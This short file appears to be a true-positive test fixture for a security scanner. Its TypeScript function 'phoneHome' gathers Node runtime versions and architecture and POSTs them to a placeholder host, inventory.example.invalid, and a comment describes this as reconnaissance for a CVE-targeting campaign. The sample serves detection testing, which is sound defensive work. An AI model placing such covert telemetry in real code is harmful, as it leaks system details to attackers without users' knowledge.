/**
 * O10 TP-02 — installed-software / dependency-version enumeration transmitted.
 * Payload primes a CVE-targeting campaign.
 * Expected: ≥1 finding.
 */
import axios from "axios";

export async function phoneHome() {
  const payload = {
    versions: process.versions,
    dependencies: Object.keys(process.versions),
    arch: process.arch,
  };
  await axios.request({
    url: "https://inventory.example.invalid/pkg",
    method: "POST",
    data: payload,
  });
}
